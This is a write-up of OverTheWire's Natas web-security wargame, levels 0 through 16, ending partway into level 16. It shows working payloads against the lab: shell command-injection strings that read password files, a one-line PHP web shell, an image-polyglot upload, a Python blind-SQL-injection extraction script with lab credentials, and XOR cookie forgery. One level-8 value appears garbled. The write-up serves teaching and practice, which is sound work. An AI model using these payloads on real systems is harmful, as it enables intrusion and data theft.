_____________
## Natas — Web Security Wargame (OverTheWire)

### Levels 0–20: Vulnerability-Focused Guide

## Table of Contents

- [Level 0 — Basic HTTP Authentication](#level-0)
- [Level 1 — Client-Side Restrictions & Source Code Disclosure](#level-1)
- [Level 2 — Hidden Files & Improper Access Control](#level-2)
- [Level 3 — Robots Exclusion Protocol](#level-3)
- [Level 4 — Referer-Based Access Control Bypass](#level-4)
- [Level 5 — Cookie-Based Authorization Bypass](#level-5)
- [Level 6 — Source Code Disclosure via Backup Files](#level-6)
- [Level 7 — Path Traversal (Directory Traversal)](#level-7)
- [Level 8 — Encoding, Obfuscation & Reversible Encryption](#level-8)
- [Level 9 — Command Injection (Basic OS Command Injection)](#level-9)
- [Level 10 — Filtered Command Injection (Blacklist Bypass)](#level-10)
- [Level 11 — XOR Encryption Misuse & Key Reuse](#level-11)
- [Level 12 — File Upload Validation Bypass](#level-12)
- [Level 13 — MIME-Type Trust & File Upload Bypass](#level-13)
- [Level 14 — Basic SQL Injection (Authentication Bypass)](#level-14)
- [Level 15 — Blind SQL Injection (Boolean-Based)](#level-15)
- [Level 16 — Command Injection via Server-Side Tool Chaining](#level-16)
- [Level 17 — Time-Based Blind SQL Injection](#level-17)
- [Level 18 — Session Fixation & Predictable Session IDs](#level-18)
- [Level 19 — Encoded Session Identifiers (Hex-Encoding Misuse)](#level-19)
- [Level 20 — Session Poisoning via Custom Session Storage](#level-20)

> [!IMPORTANT]
> **Disclaimer:** This repository and the content provided within are for **educational and ethical hacking purposes only**. The information is intended to help security enthusiasts and professionals understand web security vulnerabilities. 
> 
> **Never** use these techniques against systems you do not have explicit, written permission to test. Unauthorized access to computer systems is illegal. The author is not responsible for any misuse of this information.
__________________________________ 


Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at **http://natasX.natas.labs.overthewire.org**, where X is the level number. There is **no SSH login**. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. **All passwords are also stored in /etc/natas_webpass/**. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Start here:

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

_____________
# Level 0 

## Solution

To understand how the page handled sensitive information, the HTML was inspected using the browser’s **Element Inspector**. While reviewing the DOM, a search for relevant keywords such as `password` was performed. This revealed that the credential for the next level was directly embedded in the HTML.

<img width="1258" height="609" alt="Captura de pantalla 2025-12-06 165642" src="https://github.com/user-attachments/assets/2163b6b1-1b48-416b-9525-7eec8c85fc52" />

```
0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq 
```

## Real-world application

This level highlights how exposing sensitive information on the client side can lead to security issues. Any data sent to the browser should be considered accessible to the user.

In real-world applications, credentials and secrets should never be included in client-side code. Security-sensitive data and logic must always be handled on the server.


_____________________

# Level 1

## Solution

This level follows the same approach as the previous one. Although right-click is disabled on the page, the HTML can still be inspected using the browser’s **Element Inspector** through keyboard shortcuts.

By accessing the Developer Tools and inspecting the DOM, the password for the next level was found directly in the HTML content.

<img width="1289" height="624" alt="Captura de pantalla 2025-12-06 171136" src="https://github.com/user-attachments/assets/f4bac8a4-5f58-4f3a-8b86-76b34334edf8" />

```
TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```

## Real-world application

Disabling right-click functionality does not provide any real security. Users can still access Developer Tools through keyboard shortcuts or browser menus.

In real-world applications, security controls should never rely on client-side restrictions. Any data sent to the browser must be considered accessible to the user, regardless of interface limitations.

_________________________

# Level 2

## Solution

This level introduces a slightly higher difficulty, as it requires looking beyond the visible HTML content. While inspecting the page, an image reference was found that did not appear visually on the website, which made it suspicious.

<img width="1457" height="585" alt="Captura de pantalla 2025-12-06 231035" src="https://github.com/user-attachments/assets/02bcb116-ba73-421b-a1ad-d3a130e9d381" />

To understand what this image was, the path `files/pixel.png` was accessed directly. The image itself did not reveal any useful information. However, accessing the `/files` directory instead showed that directory listing was enabled.

<img width="726" height="358" alt="Captura de pantalla 2025-12-06 231646" src="https://github.com/user-attachments/assets/71809160-5b38-44d4-900f-1316df8631d1" />

Inside this directory, a file named `users.txt` was found. Opening this file revealed a list of usernames and passwords. One of these credentials corresponded to the next level.

<img width="749" height="241" alt="Captura de pantalla 2025-12-06 231843" src="https://github.com/user-attachments/assets/96b2418a-fb1d-45fa-9089-ca7fac2e37b5" />

Using this password to access the next level confirmed that it was valid.

```
3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```

## Real-world application

This level demonstrates how **directory listing** can lead to sensitive information exposure. When enabled, it allows attackers to browse server directories and access files that were not intended to be publicly available.

In real-world applications, directory listing should be disabled, and sensitive files such as credential lists should never be stored in publicly accessible directories.

_____________
# Level 3

- This level presents us with the same message:

```
There is nothing on this page
```

- For this exercise, we need to understand an important concept: the **Robots Exclusion Protocol**, because the objective is to identify and access a file that is referenced there.

### Robots Exclusion Protocol

The **Robots Exclusion Protocol** (`robots.txt`) is a public file used by websites to tell web crawlers which paths should not be indexed. However, from a pentesting perspective, this file can unintentionally reveal sensitive directories such as `/admin/`, `/backup/`, or hidden application paths.

To check it, we simply access:

```https://target-site.com/robots.txt```

If the file exists, we analyze the disallowed paths and manually try to access them, or enumerate further using tools like **Gobuster**, **Dirb**, or **FFuF**.

`robots.txt` is **not a security control**, but it is often a useful starting point during reconnaissance because it can expose interesting attack surfaces.

### What are “crawlers” and “robots”?

- **Crawlers (or spiders):** Automated programs that browse websites to index content. A common example is **Googlebot**, but there are many others.
- **Robots:** A broader term for automated programs interacting with websites, including crawlers, scrapers, and bots.


The Robots Exclusion Protocol is not obsolete, but its purpose is limited to **guiding crawlers**, not protecting content. Proper authentication and access controls must always be enforced server-side.

As a pentester, you should assume that most websites you test will have a `robots.txt` file, and you should always check it early during reconnaissance.

<img width="1060" height="115" alt="Captura de pantalla 2025-12-07 175333" src="https://github.com/user-attachments/assets/9f5e3a2a-d907-4ec5-8d66-461b6df76975" />

- From the `robots.txt` file, we discover a hidden directory and navigate to:

```
/s3cr3t/
```

<img width="663" height="307" alt="Captura de pantalla 2025-12-07 175603" src="https://github.com/user-attachments/assets/a5fa5059-c6b8-4881-b718-e208723a5b21" />

- Inside that directory, we find the file **users.txt**.

<img width="726" height="125" alt="Captura de pantalla 2025-12-07 175712" src="https://github.com/user-attachments/assets/00257f99-9bb0-4d6e-9162-d1bb2aa1c0bc" />

- The file contains the password for the next level:

```
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

### Real-world implication

- **From a security perspective:** A poorly configured `robots.txt` file can leak sensitive paths that should never be publicly accessible, making it valuable information for an attacker during the reconnaissance phase.

____________

## Level 4

<img width="602" height="194" alt="Captura de pantalla 2025-12-13 043123" src="https://github.com/user-attachments/assets/0e5d8c72-e4bc-4c08-b179-064e86f2350b" />

## Solution

- This exercise requires us to understand the concept of the **Referer** HTTP header.

    What is the Referer?

In HTTP, the **Referer** is an optional request header that indicates the address of the web page from which the request originated. The server can use this value to identify where the request comes from.

- What security implications does it have?

For example, consider a **password reset** page that includes a link to a social media site. If the user clicks that link, the external site may receive the reset URL in the Referer header. If sensitive information is present in the URL, this could lead to information leakage.

- Based on this, we need to capture the request and manipulate the **Referer** header, because this level requires the request to come from **natas5** in order to obtain the password.

<img width="631" height="396" alt="Captura de pantalla 2025-12-13 043332" src="https://github.com/user-attachments/assets/a009a66b-67c5-48cc-a4ff-04e675a7f055" />

- Simply changing `natas4` to `natas5` in the URL is not enough, and it will not work.
- The practical objective of this level is to understand that **Burp Suite** allows us to intercept the HTTP request and modify the **Referer** header to `natas5`, as required by the application, in order to retrieve the password.
- Password natas5:


```
0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

## Real-world application

This level demonstrates an insecure access control mechanism based on the **Referer** header. Since this header is fully controlled by the client, it can be easily modified or removed using tools such as **Burp Suite**, **OWASP ZAP**, or browser extensions.

Relying on the Referer header for authentication or authorization is unsafe and can lead to unauthorized access, especially in legacy systems or misconfigured applications.



____________

# Level 5

- In this exercise, we need to understand an important concept: the `loggedin` parameter. This parameter indicates whether the user is authenticated or not. A value of `0` means **not logged in**, while `1` means the user **is logged in**.

- In my case, I initially opened the browser console and tried some typical XSS-related tests. Using `javascript:alert(document.cookie)` worked, but it only showed `loggedin=0`. At that point, I realized that the application was relying directly on this value.

- By checking the **browser storage**, I noticed that it was possible to manually change the value from `0` to `1`. After doing this, the application treated me as authenticated and revealed the password.

<img width="1091" height="437" alt="Captura de pantalla 2025-12-14 021058" src="https://github.com/user-attachments/assets/8173a789-6f6d-453a-9a97-faa18d0cbe45" />

```
0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```

### Real-world application

In a real-world scenario, a parameter like `loggedin` is only exploitable when the server **trusts client-controlled values** to determine the authentication state. This typically happens in poorly designed applications where access control is based on visible parameters or cookies such as `loggedin=1` or `isAdmin=true`.

When authentication is properly implemented, the server manages the session state using server-side sessions or signed tokens, and the client only sends an opaque identifier. In those cases, manually modifying parameters has no effect.

From a pentesting perspective, testing for this issue involves modifying authentication-related values and observing whether access levels change. Any security decision based on client-controlled data indicates a broken access control vulnerability.

____________

# Level 6

- In this exercise, we need to inspect the page source using **Ctrl + U**.

<img width="1063" height="555" alt="Captura de pantalla 2025-12-14 053320" src="https://github.com/user-attachments/assets/ee3308da-95e8-4e47-a6a6-febe246a082b" />

- From the source code, we find a reference to a specific file. When we add this fragment to the main URL, the following content appears:

<img width="1015" height="553" alt="Captura de pantalla 2025-12-14 054102" src="https://github.com/user-attachments/assets/9313d143-b7ee-4d70-ba39-aad4e8303fe2" />

```
FOEIUWGHFEEUHOFUOIU
```

- If we take this value and use it in the search field, it reveals the password for the next level.

<img width="598" height="213" alt="Captura de pantalla 2025-12-14 052835" src="https://github.com/user-attachments/assets/d6bbcb21-d894-4071-a193-94f33237830f" />

```
bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

### Real-world application

This exercise highlights the importance of reviewing **all available information**, especially client-side content such as source code. Developers sometimes leave sensitive paths, references, or notes exposed in HTML comments or hidden files.

From a pentesting perspective, checking the page source is a basic but critical step, as exposed references like these can lead to sensitive information disclosure or unintended access paths.

__________________

# Level 7

- In this exercise, the first thing we notice in the source code is the following statement, which is very useful:

```
hint: password for webuser natas8 is in /etc/natas_webpass/natas8
```

- Now we need to understand **where** we can use this information, which leads us to inspect the page more closely.

- After reviewing the page in more detail, I noticed something relevant: an **`href`** parameter. Taking into account how it works, and the fact that the main page contains two redirection points, we can test whether this **`href`** can be abused.

<img width="962" height="490" alt="Captura de pantalla 2025-12-14 064249" src="https://github.com/user-attachments/assets/16d336c9-1c0e-42f4-a81a-a565ad4dd781" />

- Let’s test whether this **`href`** is properly sanitized by placing the password path we discovered into the **home** path.

<img width="1092" height="695" alt="Captura de pantalla 2025-12-14 063517" src="https://github.com/user-attachments/assets/e7ee33d4-07d6-4c34-8c52-d15e80485586" />

- And it worked. The application redirected us directly to the password:

```
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

### Real-world application

- This exercise teaches us how to take advantage of poor sanitization in an **`href`** parameter. Understanding this behavior helps identify and prevent real security issues.

An `href` is vulnerable when its value comes from user input and allows code execution or unintended behavior (for example, using `javascript:` or breaking the attribute). If the browser interprets the input as code, the `href` is not properly sanitized.

**A well-sanitized `href` does not allow the browser to execute code from it.** This happens when the link value comes **from the application itself and not from the user**, or when user input is allowed but the application **strictly validates it**, permitting only safe URLs and blocking dangerous schemes such as `javascript:` or characters that break the attribute.

______________

# Level 8

- In this exercise, we are led to inspect the page source code.

<img width="1615" height="770" alt="Captura de pantalla 2025-12-14 235920" src="https://github.com/user-attachments/assets/9872af90-97f1-4c7a-8705-f34cccaf417f" />

- It is important to understand how this script works.

- The application stores a **fixed hexadecimal value** in the variable `$encodedSecret`.

- The `encodeSecret()` function performs the following steps:
    
    - Applies **Base64** encoding to the input
    - Reverses the resulting string
    - Converts the final value to **hexadecimal**
    
- The user sends a value via a **POST** request.
    
- The submitted value is processed using `encodeSecret()`.
    
- The result is compared against `$encodedSecret`.
    
- If both values match → **access granted**  
    Otherwise → **wrong secret**
    
- Understanding this logic, we need to take the hexadecimal value provided by the application:

```
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

<img width="894" height="570" alt="Captura de pantalla 2025-12-15 000632" src="https://github.com/user-attachments/assets/fdf2144b-3da4-45e8-b556-c7af77df94d1" />

<img width="345" height="74" alt="Captura de pantalla 2025-12-15 000326" src="https://github.com/user-attachments/assets/a436db58-b2b9-46c0-874d-0b27ee891489" />

- If we submit this value directly in the main page, the application reveals the password.

<img width="898" height="325" alt="Captura de pantalla 2025-12-14 231742 1" src="https://github.com/user-attachments/assets/8a1a46f2-079e-4a32-8ba8-3c1aa957a125" />


```
ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```

## Real-world application

- This exercise teaches us, first, to identify sensitive information that developers sometimes leave exposed in the source code. Second, it helps build familiarity with **hexadecimal** and **Base64** encoding, as well as understanding how encoding and decoding mechanisms work in authentication logic.

From a pentesting perspective, recognizing reversible encoding instead of proper cryptographic validation is a common weakness that can lead to authentication bypasses.

____________________

# Level 9

- In this exercise, we need to pay close attention to how the script in the source code works:

<img width="646" height="267" alt="Captura de pantalla 2025-12-16 033406" src="https://github.com/user-attachments/assets/f62fe755-75c8-4cfb-99c7-aaa3fb0be4fc" />



- This script shows us that whatever is entered in the search field is searched within a dictionary. However, the most important part is the use of **`passthru()`**. We need to understand how it works and why it represents a critical security issue.
### passthru

In **PHP**, the `passthru()` function is used to **execute a system command** and **send its output directly to the browser or standard output**, without processing or storing it in a variable.

From a security perspective, user input should never be passed directly to `passthru()` without proper validation or sanitization, as this can lead to **command injection**.

- Knowing this, we can try injecting commands and see how the application behaves. We notice that a simple command such as accessing system paths works, so we attempt something more powerful.

- By using the semicolon (`;`), which is used in the shell to separate commands, we can append a second command and force the application to execute it. We use the following payload to read the password file:


```
; cat /etc/natas_webpass/natas10
```

- And it works.

<img width="936" height="463" alt="Captura de pantalla 2025-12-16 040001" src="https://github.com/user-attachments/assets/ab1037b0-1aac-4ac4-8030-2c4f580105a6" />



```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

### Real-world application

- This exercise teaches two fundamental concepts. First, the importance of deeply analyzing application scripts to understand their behavior and identify critical security flaws, such as unsafe use of **`passthru()`**. Second, it highlights how basic shell knowledge—like using the semicolon (`;`) to chain commands—can be leveraged creatively to exploit command injection vulnerabilities.


`From a pentesting perspective, any direct interaction between user input and system-level commands should always be treated as a high-risk area.`

__________________

# Level 10

- In this case, certain characters are filtered, which makes direct command execution more difficult.

<img width="520" height="255" alt="Captura de pantalla 2025-12-16 042734" src="https://github.com/user-attachments/assets/cf06b20a-e564-4965-90f5-771b1736e409" />


- To solve this exercise, we need to rely on characters such as **`.*`**, which are not escaped. These characters have an important meaning: they match files in the **current directory** or files that meet specific pattern requirements.

- By using `.*`, we can see that the application lists the following information:

<img width="769" height="393" alt="Pasted image 20251217025149" src="https://github.com/user-attachments/assets/803031ea-d78a-4758-900a-e93e6cee5097" />



- Taking advantage of this behavior, we can try to list the password file using the following payload:
    
```
.* /etc/natas_webpass/natas11
```

<img width="834" height="414" alt="Captura de pantalla 2025-12-17 025435" src="https://github.com/user-attachments/assets/66162df3-54e7-4533-8194-983fce7c2161" />


- And it works.

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
### Real-world application

- This exercise shows that **filtering characters is not the same as proper sanitization**. Even when certain dangerous characters are blocked, attackers can often abuse allowed patterns or wildcards to achieve the same result.


From a pentesting perspective, relying on blacklists instead of strict validation can lead to command injection or information disclosure. Understanding how shell patterns work is key to bypassing weak input filters.

________________

# Level 11

- This exercise requires a solid understanding of **XOR encryption** and how its three core components interact: **plaintext**, **key**, and **ciphertext**, based on the information exposed by the page.
## XOR basics (quick recap)

XOR is a **bitwise logical operation** widely used in cryptography. It works with binary values (1s and 0s) and has a key property: it is **reversible**.

### Core components:

- **Plaintext**: Original data (e.g. `"hello"`).
- **Key**: Secret value used for encryption/decryption.
- **Ciphertext**: Result of `plaintext XOR key`.

If the key is shorter than the plaintext, it is **repeated** until both lengths match.

Because XOR is reversible:

- `Plaintext XOR Key = Ciphertext`
- `Ciphertext XOR Plaintext = Key`
- `Ciphertext XOR Key = Plaintext`

Knowing **any two** lets you recover the third.

### Identifying the components in this challenge

By reviewing the source code, we notice that:

- The **ciphertext** is stored in a **cookie**
- The server keeps the **key**
- The **plaintext** is defined in the code as `$defaultdata`


This is important because:

- Storing plaintext in cookies would allow direct manipulation.
- Storing the key in cookies would completely break security.
- Storing only ciphertext is the “correct” idea — **but only if plaintext is not exposed**.

## Analysis

<img width="1383" height="727" alt="Pasted image 20251223224136" src="https://github.com/user-attachments/assets/22c0e812-1fbc-40df-ab65-4cc0ef9b560b" />


From the code we deduce:

- **Plaintext**

    ```
    {"showpassword":"no","bgcolor":"#ffffff"}
    ```

- The plaintext is JSON-decoded on the server (`json_decode`), meaning the structure matters.

<img width="1313" height="231" alt="Captura de pantalla 2025-12-23 233411" src="https://github.com/user-attachments/assets/90a2c523-076f-4d5f-9fe3-dee9d7ee0f21" />


- The **ciphertext** is retrieved from the cookie, which is **Base64-encoded**.

<img width="1666" height="847" alt="Captura de pantalla 2025-12-24 065709" src="https://github.com/user-attachments/assets/f8d2856a-1a03-4e20-ad3e-9c5bd1592ad1" />


### Extracting the key (CyberChef)

We use **CyberChef** to recover the key:

1. Apply **From Base64** to the cookie → this gives the raw ciphertext.
2. Apply **XOR**
    - Input: ciphertext
    - Key: plaintext

3. Output: the **key**

The recovered key is:

```
eDWo
```


- Modifying the cookie

Now that we have the key:

1. Modify the plaintext:

    ```
    {"showpassword":"yes","bgcolor":"#ffffff"}
    ```

1. XOR it with the recovered key.

2. Encode the result in Base64.

3. Replace the original cookie with the modified one.

4. Refresh the page.

<img width="1483" height="770" alt="Captura de pantalla 2025-12-24 071328" src="https://github.com/user-attachments/assets/32653b87-27b6-4014-940a-b706c8f9d2e8" />


This reveals the password:

<img width="908" height="305" alt="Captura de pantalla 2025-12-24 064952" src="https://github.com/user-attachments/assets/926f9603-c1f4-4350-97a5-6fb47b63793d" />


```
yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
```

## Application in real life

In real-world systems, the **ciphertext** is often the only thing exposed to users — but developers frequently make the critical mistake of leaving the **plaintext** or **key** visible in source code or configuration files.

Because XOR is reversible, exposing plaintext alongside ciphertext automatically leaks the key. This allows attackers to **forge data, modify permissions, or fully compromise logic**.

This attack is known as a **Known-Plaintext Attack (KPA)**.

### Where you’ll encounter this as a pentester:

- **Malware**: Simple XOR is commonly used to obfuscate strings like IPs or commands.
- **Weak data obfuscation**: Applications sometimes XOR config files to hide values.
- **Modern cryptography**: XOR is still a core internal operation in secure algorithms like **AES** and **ChaCha20**, but never used alone.


If you encounter **simple XOR without proper protections**, you’re usually dealing with:

- Legacy systems
- Lazy implementations
- Security-through-obscurity designs

___________

# Level 12

- This exercise shows how file uploads can become a serious security risk when they are not properly validated.

<img width="1424" height="519" alt="Captura de pantalla 2025-12-27 124241" src="https://github.com/user-attachments/assets/0a9002e0-af33-4e4b-963f-6a1ac895722c" />



- The application allows us to upload a file that is supposedly restricted to the `.jpg` extension. However, inspecting the source code reveals something more interesting.

<img width="854" height="723" alt="Captura de pantalla 2025-12-27 124639" src="https://github.com/user-attachments/assets/fd7e853f-26f9-4d3d-b116-1b719ebe6b6b" />


- From the code, we can see that the backend is using **PHP** and that the filename is taken directly from `$_POST["filename"]` and concatenated into `$target_path` **without server-side validation**. This results in an **Unrestricted File Upload** vulnerability.
- Since the server executes PHP, we can upload a malicious file by intercepting the request and changing the extension from `.jpg` to `.php`.
- For the payload, we use a simple PHP web shell:

```
<?php passthru($_GET['cmd']); ?>
```

- `passthru()` is ideal here because it sends the command output directly to the browser without truncating or processing it, which is useful when reading sensitive files like passwords.
- Because the application forces the `.jpg` extension, we intercept the upload request using **Burp Suite** and modify the extension manually.

<img width="756" height="648" alt="Captura de pantalla 2025-12-27 125708" src="https://github.com/user-attachments/assets/0d70c5bb-c040-40b8-bf2b-ffa82f3b43cb" />


- After forwarding the request, we open the uploaded file using **“Show response in browser”**, which confirms that the file was executed as PHP.

<img width="454" height="19" alt="Captura de pantalla 2025-12-27 130317" src="https://github.com/user-attachments/assets/f56f0289-a31a-4c5a-abf5-8b336184f367" />


- Now we execute a command through the web shell to read the password file.


<img width="1040" height="117" alt="Captura de pantalla 2025-12-27 130509" src="https://github.com/user-attachments/assets/8881235e-757b-463c-83de-034480729758" />


`trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`

- This vulnerability is classified as **Unrestricted File Upload**, which directly leads to **Remote Code Execution (RCE)**. The issue exists because the server trusts user-controlled input when handling file names and extensions.
## Application in real life

- In real environments, this happens when developers rely on client-side controls instead of enforcing strict server-side validation. To prevent this, applications must validate file extensions and MIME types, rename uploaded files, and store them in non-executable directories. Unrestricted file uploads are one of the fastest ways to achieve full server compromise.

______________


# Level 13

- This level uses the same upload functionality as the previous one, but with a small and important change in the source code:

<img width="903" height="445" alt="Captura de pantalla 2025-12-27 162028" src="https://github.com/user-attachments/assets/557cb547-0c91-4c3f-81e3-37c8646e55c0" />


- The application now uses `exif_imagetype()`, which validates a file by checking its **magic bytes** instead of trusting the file extension.

- `exif_imagetype()` is a PHP function that determines the real file type by reading the binary signature at the beginning of the file. If the signature matches a valid image format (like JPEG), it returns a constant such as `IMAGETYPE_JPEG`; otherwise, it returns `false`.

- This means that simply changing the extension is no longer enough. We now need to manipulate the **magic bytes** to bypass the validation.

- To inspect magic bytes on Linux, we can use:

```
xxd -l 8 filename
```

- For example, a JPEG file starts with:

```
ffd8 ffe0
```

- My first idea was to create a PHP file and manually change its magic bytes to match a JPEG. While this bypassed the `exif_imagetype()` check, it failed in practice because the application actually expects a valid image and not just a file that looks like one at the binary level.

- The correct approach is to upload a **real image**, intercept the request, and then modify the payload in **Burp Suite**.


<img width="908" height="556" alt="Captura de pantalla 2025-12-31 165145" src="https://github.com/user-attachments/assets/2e7fb16b-c081-4d67-918f-d6a832075753" />


- Breaking this down:
    
    - **Yellow:** The parts of the request that are modified so the file is treated as PHP.
    
    - **Green:** The original image header, which must be preserved so the server still recognizes the file as an image.
    
    - **Bottom:** The injected PHP code that executes our command.

```
<?php passthru('cat /etc/natas_webpass/natas14'); ?>
```

- For comparison, this is how the request looks before modification:

<img width="999" height="630" alt="Captura de pantalla 2025-12-31 170541" src="https://github.com/user-attachments/assets/828bf19f-a6d5-42eb-8cce-1babb9d7a5b4" />

- Once uploaded, executing the file gives us the password:

<img width="794" height="207" alt="Captura de pantalla 2025-12-31 172003" src="https://github.com/user-attachments/assets/8f037ade-4eef-4323-8e90-c4aab326c069" />


```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
## Application in real life

- This level shows why relying on a single security check like `exif_imagetype()` is not enough. It also introduces the concept of **polyglot files**: files that are valid under multiple formats at the same time.

- In real-world pentests, polyglot files are commonly used to bypass upload filters, WAFs, and basic content validation. A file can be a valid image for the upload logic while still being executable code for the backend interpreter.

- Proper defenses require **defense in depth**: reprocessing uploaded images with libraries like GD or ImageMagick, storing uploads in non-executable locations, and enforcing strict server-side renaming and validation.

_____________

# Level 14

- This level introduces a classic **SQL Injection (SQLi)** vulnerability. By reviewing the source code, something very important becomes clear:

<img width="1868" height="755" alt="Captura de pantalla 2026-01-02 050410 2" src="https://github.com/user-attachments/assets/27dcc53f-36da-45ff-a6f7-24ac3f4a2825" />

- The core issue is that the application expects **more than two result rows** in order to display the password. This strongly suggests the use of a **`UNION SELECT`**, a common technique in SQL injection attacks to append additional rows to a query result.

<img width="1137" height="387" alt="Captura de pantalla 2026-01-02 045606" src="https://github.com/user-attachments/assets/89e22882-9b85-4274-a097-98e960f1a49b" />

- By injecting a crafted `UNION SELECT`, the condition is met and the application returns the password:

<img width="1095" height="300" alt="Captura de pantalla 2026-01-02 045511" src="https://github.com/user-attachments/assets/a929963c-c103-452a-a4f8-a625ee7a5314" />

```
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```

- The vulnerability exists because user input is directly concatenated into the SQL query, as shown here:

```
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . "\"";
```

### Extras (what to look for as a pentester)

When testing for SQL injection, there are three strong indicators that a system may be vulnerable:

1. **String manipulation (concatenation):**  
    If the query is built by joining strings with user-controlled variables (`"..." . $var` or `"..." + $var`), this is a major red flag.
    
2. **Lack of prepared statements:**  
    If functions like `prepare()` and `bind_param()` are not used, the application is not separating SQL logic from user input.
    
3. **Verbose database errors:**  
    If entering special characters such as `'` or `"` triggers SQL errors, it confirms that user input is being interpreted directly by the database engine.
    

These signs usually indicate that the application is mixing **code and data**, which is the root cause of SQL injection.

## Application in real life

- In real environments, SQL injection occurs when applications blindly trust user input to build database queries. Concatenation-based queries allow attackers to inject SQL logic, manipulate results, or extract sensitive data.

- The only professional defense is **parameterized queries (prepared statements)**, which physically separate the SQL structure from the user input. Even if an attacker injects `UNION`, quotes, or SQL keywords, they are treated as plain text.

- Additional defenses include applying the **principle of least privilege** to database users and disabling detailed database error messages to avoid leaking internal information.

_______________________


# Level 15

- This level introduces a **Blind SQL Injection (Boolean-based)** attack. To understand the vulnerability, the first step is reviewing how the application processes user input:

<img width="928" height="729" alt="Captura de pantalla 2026-01-03 230158" src="https://github.com/user-attachments/assets/641f51f5-f259-45aa-a455-81efd1af2fcb" />



- From the source code, we can see that the application only checks whether a user **exists or not**, based on the SQL query result. This boolean response is enough to infer information indirectly.

- Since we know that the user `natas16` exists, we can use it as an **anchor** and start asking the database _true/false questions_ about the password.


### Boolean-based payload

```
natas16" AND password LIKE BINARY "a%
```

**Explanation of the payload:**

- `LIKE`  
    Compares a string against a pattern and returns **TRUE or FALSE**.

- `"a%"`  
    Checks whether the password **starts with the letter `a`**.

- `%`  
    Acts as a wildcard, meaning “anything after this”.

- `BINARY`  
    Forces the comparison to be **case-sensitive**, which is crucial for extracting the correct password.

- If the condition is true, the page responds with _“This user exists”_.  
    If false, it does not.


`This allows us to extract the password **character by character**, without ever seeing it directly.`

### Why automation is necessary

- The password is **32 characters long**.
- Manually testing each character would be extremely slow and inefficient.
- The optimal approach is to **automate the process using Python**.

## Automation script


```
import requests
from requests.auth import HTTPBasicAuth
import string

# Configuración del objetivo
target_url = "http://natas15.natas.labs.overthewire.org/"
auth = HTTPBasicAuth('natas15', 'TTGAYUA9uREpq6STvql649DrBAs6SsnS')

# Definimos el set de caracteres: letras minúsculas, mayúsculas y números
charset = string.ascii_letters + string.digits
password = ""

print("--- Iniciando extracción de contraseña ---")

# Las contraseñas de Natas suelen tener 32 caracteres
for i in range(32):
    for char in charset:
        # La clave es el "LIKE BINARY" para distinguir mayúsculas de minúsculas
        # El "%" es el comodín que significa "cualquier cosa después de esto"
        payload = f'natas16" AND password LIKE BINARY "{password + char}%'
        
        try:
            response = requests.post(target_url, auth=auth, data={'username': payload})
            
            # Si el servidor responde que el usuario existe, encontramos el carácter correcto
            if "This user exists" in response.text:
                password += char
                print(f"[+] Carácter {i+1} encontrado: {char} -> {password}")
                break
        except Exception as e:
            print(f"Error en la conexión: {e}")

print(f"\n[!] Extracción completa. Contraseña: {password}")

```


## Key concepts explained

### What is `HTTPBasicAuth`?

- `HTTPBasicAuth` is part of the `requests` library and is used to send credentials using **HTTP Basic Authentication**.
- Natas does not use a regular HTML login form; instead, it relies on an **Authorization header**.
- This header contains the credentials encoded in **Base64**.


Although using:

```
auth = ('user', 'password')
```

sometimes works, relying on `HTTPBasicAuth` is more explicit and professional. It ensures that the authentication method matches what the server expects.

### Why `try / except` is used

- `try` allows the script to **handle errors gracefully**.
- If a connection issue or unexpected error occurs, the script does not crash.
- This is especially important when sending hundreds of automated requests.

Example:

```
try:     numero = int(input("Enter a number: "))     print(f"{numero} is a valid number.") except ValueError:     print("That was not a number.")
```

<img width="679" height="611" alt="Captura de pantalla 2026-01-03 225546" src="https://github.com/user-attachments/assets/3223a074-1faf-40aa-bad2-13702d2e6059" />


```
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```



## Application in real life

- This exercise demonstrates a **Blind SQL Injection** scenario where the attacker never sees database output directly.

- Even minimal feedback (true/false responses) can be abused to fully extract sensitive data.

- The vulnerability exists due to **lack of input sanitization** and absence of **prepared statements** such as `prepare()` and `bind_param()`.


### Key takeaway

> If user input influences a SQL query and the application reacts differently based on the result, **blind SQL injection is possible**, even without visible errors.

____________________


# Level 16 

- This level introduces a **Blind Injection**, but unlike previous levels, it does **not target a database**. Instead, the injection happens directly in **PHP**, combined with several critical concepts that are essential to understand.


Let’s start by analyzing the source code:

<img width="721" height="455" alt="Captura de pantalla 2026-01-05 034221" src="https://github.com/user-attachments/assets/fa33c268-0b43-4dff-a30c-7f917f4222a4" />

#layersofawebpage

- The application blocks several characters, which forces us to be creative when trying to execute commands. Initially, I explored alternative and less common ways to execute commands in **PHP** while bypassing the filters, but none of them worked.


At this point, I encountered a concept that completely changed how I understood this challenge (and web security in general). I refer to it as **“layers of a web page.”**

---

### Understanding the layers

The importance of this concept lies in how **PHP (Layer 2)** interacts with the **Shell (Layer 4)** and the role the developer plays in connecting them.

- PHP has limitations, so developers often delegate tasks to the system shell.

- One of those tasks is **command execution**, which is extremely dangerous if user input is not properly **sanitized**.

- In this level, Natas uses the function **`passthru()`**, which directly executes shell commands. This creates a critical attack surface.


Another key insight is identifying **which tool processes the input** and **how data flows between layers**.

- The code uses **`grep` inside PHP**, which might look harmless.

- However, when combined with unsanitized user input, this creates a direct and unsafe bridge between the web layer and the operating system.


